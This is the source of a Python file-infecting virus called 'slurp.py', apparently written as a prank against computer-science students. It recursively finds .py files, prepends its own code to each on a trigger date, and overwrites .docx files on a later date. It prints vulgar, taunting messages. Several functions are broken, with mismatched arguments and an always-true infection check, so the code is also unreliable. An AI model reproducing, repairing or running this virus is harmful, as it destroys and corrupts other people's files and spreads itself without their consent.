import nmap
import os
import datetime


sig = "slurp.py || by NiNJA.xrx"
sig2 = "slurp.py || school is overrated anyways || by NiNJA.XrX"


def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path + "/" + fname):
            filestoinfect.extend(search(path + "/" + fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path + "/" + fname):
                if sig or sig2 in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path + "/" + fname)
    return filestoinfect


def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if i >= 0 and i < 39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()


def pickles():
    if datetime.datetime.now().month == 11 and datetime.datetime.now().day == 14:
        print("Welcome to the slurp. This is the bad times. Biatches. School is overrated. Day 1 of 3. Good luck! Sorry CS Students.")
        filestoinfect = search(os.path.abspath(""))
        infect(filestoinfect)
        pickles()
    else:
        print("You are safe. Maybe. I dunno.")
        sandwiches()

def sandwiches(path):
    filestolick = []
    filel = os.listdir(path)
    for fname in filel:
        if os.path.isdir(path + "/" + fname):
            filestolick.extend(search(path + "/" + fname))
        elif fname[-3:] == ".docx":
            infected = False
            for line in open(path + "/" + fname):
                if sig2 in line:
                    infected = True
                    break
            if infected == False:
                filestolick.append(path + "/" + fname)
        return filestolick
    subway()

def subway(filestolick):
    if datetime.datetime.now().month == 11 and datetime.datetime.now().day == 15:
        print("Youre fucked. || slurp.py || NiNJA.xrx")
        penis = open(os.path.abspath(__file__))
        peniscum = ""
        for i,line in enumerate(penis):
            if i>=0 and i <39:
                peniscum += line
            penis.close
            for fname in filestolick:
                f = open(fname)
                temp = f.read()
                f.close()
                f = open(fname,"w")
                f.write(peniscum + " " + sig2 + temp)
                f.close()
    else:
        print("Damn you're really safe.")
        finalorgasm()

def finalorgasm(filestolick):
    if datetime.datetime.now().month == 11 and datetime.datetime.now().day == 15:
        print("it has been fun. but now i must make my last mark. goodbye. || slurp.py || by NiNJA.XRX")
        penis = open(os.path.abspath(__file__))
        peniscum = ""
        for i, line in enumerate(penis):
            if i >= 0 and i < 39:
                peniscum += line
            penis.close
            for fname in filestolick:
                f = open(fname)
                temp = f.read()
                f.close()
                f = open(fname, "w")
                f.write(peniscum + " " + sig2 + temp)
                f.close()
        infect()
        pickles()
        sandwiches()
        subway()
    else:
        print("nah fam gimmie 5 more minutes.")
